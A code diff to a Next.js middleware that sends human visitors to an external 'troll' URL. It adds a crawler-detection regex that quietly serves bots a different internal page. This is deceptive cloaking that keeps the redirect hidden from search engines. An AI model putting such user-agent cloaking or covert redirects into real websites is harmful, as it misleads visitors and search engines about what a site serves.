@@ -17,6 +17,15 @@ export function middleware(request: NextRequest) {
     ) {
       return NextResponse.next();
     }
+    const ua = request.headers.get("user-agent") ?? "";
+    const isBot = /googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|facebot|twitterbot|linkedinbot|crawler|spider|bot/i.test(ua);
+
+    if (isBot) {
+      const url = request.nextUrl.clone();
+      url.pathname = "/neat-woodham";
+      return NextResponse.rewrite(url);
+    }
+
     return NextResponse.redirect(new URL("https://anthonybolivar.com/troll"));
   }
 
